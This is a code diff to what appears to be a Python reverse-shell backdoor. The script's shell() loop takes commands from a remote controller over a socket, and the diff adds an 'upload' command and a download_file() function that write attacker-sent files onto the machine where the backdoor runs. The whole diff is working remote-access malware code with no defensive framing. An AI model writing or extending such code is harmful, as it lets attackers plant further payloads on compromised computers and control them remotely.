@@ -19,6 +19,20 @@ def reliable_recv():
             continue
 
 
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+    s.settimeout(None)
+    f.close()
+
+
 def shell():
     while True:
         command = reliable_recv()
@@ -30,6 +44,8 @@ def shell():
             pass
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
+        elif command[:6] == 'upload':
+            download_file(command[7:])
         else:
             if command == 'pwd':
                 if os.name == 'nt':
